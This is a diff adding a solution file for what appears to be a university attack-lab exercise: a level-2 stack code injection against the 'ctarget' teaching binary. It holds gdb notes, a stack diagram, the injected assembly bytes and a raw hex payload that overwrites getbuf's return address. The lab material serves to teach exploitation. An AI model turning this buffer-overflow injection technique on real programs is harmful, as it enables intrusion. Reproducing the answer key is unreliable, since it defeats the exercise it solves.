@@ -1,0 +1,56 @@
+/*
+
+You can set the breakpoint at getbuf(), so that you know the address of the
+top of the stack, and calculate the address of the code to be injected.
+
+1. Write assembly code command into exploit.s;
+2. Use "gcc -c exploit.s" to generate object file exploit.o;
+3. Use "objdump -d exploit.o > exploit.d" to get byte representation.
+
+---------------- MOST IMPORTANT TECHNIQUE/PITFALL -----------------------------
+1. Object code is executed from lower address to higher address! From bottom
+to top, not from top to bottom on the stack diagram! This is against the
+normal way of reading source code!
+
+2. When you use assembly code from objdump, you do not need to reverse the order.
+But when you enter an address your self, you need to do so.
+
+------------------------------------------------------------------------------
+
+4. Stack pointer
+Before entering getbuf():
+(gdb) print /x $rsp
+$1 = 0x5561dca0
+
+5. Instruction to be inserted
+
+48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
+68 ec 17 40 00       	pushq  $0x4017ec
+c3                   	retq
+
+./hex2raw < CI_level2/level2_CI_solution.txt | ./ctarget -q
+
+
+The stack after allocating space in getbuf:
+---------------------------
+|00 00 00 00 55 61 dc 78  | 0x5561dca0, return address after calling Gets()
+---------------------------
+|00 00 00 00 00 00 00 00  |
+---------------------------
+|00 00 00 00 00 00 00 00  |
+---------------------------
+|00 00 00 00 00 00 00 00  |
+---------------------------
+|00 00 00 c3 00 40 17 ec  |
+---------------------------
+|68 59 b9 97 fa c7 c7 48  | 0x5561dc78
+---------------------------
+
+*/
+
+48 c7 c7 fa 97 b9 59 68 
+ec 17 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
